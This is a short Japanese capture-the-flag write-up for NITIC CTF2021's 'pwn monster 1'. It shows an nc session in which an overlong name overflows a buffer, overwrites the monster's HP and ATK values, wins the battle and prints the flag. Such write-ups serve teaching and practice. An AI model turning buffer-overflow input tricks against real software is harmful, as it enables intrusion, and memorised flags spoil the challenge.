# pwn monster 1
## NITIC CTF2021
## pwn
***

入力の際に大量の入力を入れると、BOFを起こしHPとATKを書き換えることができるため、敵を倒すことができる

```
$ nc 35.200.120.35 9001
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key


Welcome to Pwn Monster World!

I'll give your first monster!

Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Input name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x4141414141414141 |  4702111234474983745 |
|ATK     | 0x4141414141414141 |  4702111234474983745 |
+--------+--------------------+----------------------+
OK, Nice name.

Let's battle with Rival! If you win, give you FLAG.

[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwnchu HP: 4702111234474983745
[Rival] pwnchu HP: 9999
Your Turn.

Rival monster took 4702111234474983745 damage!


[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwnchu HP: 4702111234474983745
[Rival] pwnchu HP: -4702111234474973746
Win!

nitic_ctf{We1c0me_t0_pwn_w0r1d!}

*** stack smashing detected ***: terminated
Aborted (core dumped)
```

pwnMonsterに勝ったためフラグを表示することができるためこれをsubmitする。